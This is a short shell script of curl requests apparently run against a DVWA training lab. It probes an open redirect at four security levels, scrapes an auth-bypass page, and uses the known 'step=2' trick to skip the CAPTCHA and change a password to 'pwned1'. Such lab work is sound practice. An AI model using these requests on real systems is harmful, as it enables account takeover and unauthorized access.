CK='PHPSESSID=37451a4e56484ab7fe32cdd9b205d7ed'
B='http://10.31.0.87:3000'
mkdir -p evidence/redirect evidence/auth

for L in low medium high impossible; do
  curl -s -b "$CK; security=$L" "$B/vulnerabilities/open_redirect/source/$L.php?redirect=http://10.31.0.87/" -o /dev/null -w "$L => HTTP %{http_code}  location:%{redirect_url}\n"
done

# authbypass page scrape
curl -s -b "$CK; security=low" "$B/vulnerabilities/authbypass/" -o evidence/auth/authbypass-low.html
grep -oE '<pre>[^<]*</pre>|<td>[^<]*</td>' evidence/auth/authbypass-low.html | head -30

# CAPTCHA module (step=2 trick known in DVWA)
for L in low; do
  echo "== captcha $L"
  curl -s -b "$CK; security=$L" "$B/vulnerabilities/captcha/" --data-urlencode 'step=2' --data-urlencode 'password_new=pwned1' --data-urlencode 'password_conf=pwned1' --data-urlencode 'Change=Change' --data-urlencode 'g-recaptcha-response=x' | grep -oE 'Password Changed|CSRF|did not pass|incorrect'
done
